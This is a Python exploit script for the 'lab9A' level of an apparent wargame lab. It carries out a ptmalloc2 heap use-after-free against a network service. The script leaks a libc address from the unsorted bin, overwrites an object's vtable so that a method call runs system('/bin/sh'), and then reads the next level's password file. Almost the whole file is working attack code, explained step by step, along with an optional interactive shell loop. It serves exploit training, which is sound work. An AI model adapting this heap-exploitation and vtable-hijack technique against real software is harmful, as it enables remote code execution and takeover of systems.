#!/usr/bin/python
# coding: utf-8

'''
RCE Exploit for level lab9A
'''

#   Exploitation: In order to exploit this level, a good understanding of how
# ptmalloc2 works is essential. I will be explaining each step I took to pwn
# this challenge, but basically it leverages a use after free bug to lookup
# a function in a custom vtable which will end calling system() instead.

import socket
import time

##################
#  Global stuff  #
##################

PORT = 9941
# ****** IMPORTANT ******
# These values depend either on your VM configuration or the way your binary
# was compiled, please check that they are the same as yours before executing
# this exploit.
HOST = '10.0.0.2'  # VM IP address
baseoff = 0x1aa450  # libc base offset from main_arena.bins
systemoff = 0x40190  # system() offset from libc base
binshoff = 0x160a24  # "/bin/sh\x00" offset from libc base
# ***********************

###############
#  Functions  #
###############


def sendrecv(s, buf, rec=True):
    '''
    Sends raw data to the remote process and returns it's output.
    '''
    s.sendall(buf)
    time.sleep(0.02)
    if rec:
        return s.recv(2048)
    return None


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print '[+] Connecting to %s:%d' % (HOST, PORT)
        s.connect((HOST, PORT))
        print '[+] Connection accepted!'

        print '\n[+] Stage 1: Heap preparation'
        # I will explain later why we need this specific heap allocation
        print '[+] Creating first fast bin chunk'
        sendrecv(s, '1\n0\n4\n')
        print '[+] Creating small bin chunk'
        sendrecv(s, '1\n1\n16\n')
        print '[+] Creating second fast bin chunk'
        sendrecv(s, '1\n2\n0\n')

        # Let's start explaining the third chunk we allocated: It really
        # doesn't matter the number of items we specify to allocate here.
        # We only need this chunks to prevent the top chunk from coalescing
        # with the itemlist's free'd chunk.

        print '\n[+] Stage 2: Leak main_arena.bins address and compute ' + \
              'system() and /bin/sh'
        # This is the reason why we allocated the second chunk. We need a chunk
        # to be added to the bins array (for unsorted, small and large bins).
        # When a small or large chunk get's freed, it is first added to the
        # unsorted bin. This bin implements a circular linked list, so the
        # free'd chunk will contain an fd/bk pointer which will point to this
        # bin's location, since it is the first chunk in the bin, both fd and
        # bk pointers will point to the same location, so it doesn't matter
        # which one of them we leak).
        sendrecv(s, '4\n1\n')
        # Once free'd, the chunk will get added to the unsorted bin and fd/bk
        # will be set accordingly (pointing to the unsorted bin location).
        # Since main_arena is a global variable inside libc, we can use the
        # address of the unsorted bin to compute libc base and, therefore,
        # system()'s and /bin/sh's addresses.
        sendrecv(s, '1\n1\n16\n')  # We first need to restore the vtable
        sendrecv(s, '3\n1\n')
        out = sendrecv(s, '1\n').split('\n')[1]  # Leak fd pointer
        n = out.find('=')
        if n < 0:
            raise RuntimeError('Couldn\'t leak fd pointer :(')
        bins = int(out[n+2:])
        # Convert it to unsigned int
        bins = 0x100000000 + bins if bins < 0 else bins
        print '[+] main_arena.bins @ 0x%08x' % bins
        libcbase = bins - baseoff
        system = libcbase + systemoff
        binsh = libcbase + binshoff
        print '[+] system() @ 0x%08x' % system
        print '[+] "/bin/sh" @ 0x%08x' % binsh

        print '\n[+] Stage 3: Craft custom vtable'
        # Here is the tricky part, we need to craft a custom vtable in order to
        # call system(). Here is the way I came up with in order to acomplish
        # this:

        # The reason behind the 4 items we select to allocate space for at the
        # begining is simple. 4 items means 16 bytes, plus 8 of overhead = 24
        # which is the same size as the HashSet. This means that when both get
        # free'd, they will be assigned to the same fast bin in fastbinY.
        # This is very convenient, because the itemlist will be free'd first,
        # and then, the HashSet object. The result will be that the fd pointer
        # of the HashSet free'd chunk, will point to the itemlist's free'd
        # chunk, and the most interesting thing: fd will overwrite the vtable!

        # Now we have a way of redirecting the vtable look-up. We only need to
        # craft a proper itemlist in order to serve as the new vtable. The item
        # list should look something like this:

        # +------------------+ <-- fd points here (this will be the new vtable)
        # |     prev_size    | <-- new HashSet<int, hash_num>::~HashSet()
        # +------------------+
        # |chunk_size + flags| <-- new HashSet<int, hash_num>::~HashSet()
        # +------------------+
        # |        fd        | <-- new HashSet<int, hash_num>::add()
        # +------------------+
        # |        bk        | <-- new HashSet<int, hash_num>::find()
        # +------------------+
        # |      unused      | <-- new HashSet<int, hash_num>::get()
        # +------------------+

        # Fortunately there is one position of the new vtable that won't be
        # overwritten by free() thus we can controll it. This is the index 2.
        # The way the program computes the index to which store the data, is
        # the following: index = val % size

        # We want to insert system() address which will look something like
        # this: 0xb7XXX190. And XXXXX190 % 4 will give us an index 0. This
        # position will be overwritten with fd so it doesn't qualify as a good
        # address :( Fortunately, an address that looks like this XXXXX191 is
        # valid since XXXXX191 % 4 = 2. This means we will skip one byte of
        # system()'s code, which is just a push ebx instruction so it won't
        # matter.

        sendrecv(s, '2\n0\n%d\n' % (system+1))  # Prepare the new vtable
        sendrecv(s, '4\n0\n')  # Force free() to overwrite old vtable
        print '[+] Custom vtable ready!'
        # Now we just have to reuse the wild pointer stored in the HashSet
        # array and force a call to find() which will be system() on our
        # new vtable
        sendrecv(s, '3\n0\n')
        sendrecv(s, '%d\n' % binsh, False)  # Pass /bin/sh to system()
        print '[+] Forced call to system() lab9A should be pwned :)'
        flag = sendrecv(s, 'cat /home/lab9end/.pass\n')
        print '\n[+] flag: %s' % flag,
        # Uncomment this to keep the shell
        # while True:
        #    print sendrecv(s, raw_input('$ ')+'\n'),

    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, aborting...'
    except socket.error as e:
        print '[!] Connection error: %s' % e
    except RuntimeError as e:
        print '[!] Error: %s' % e
    finally:
        s.close()
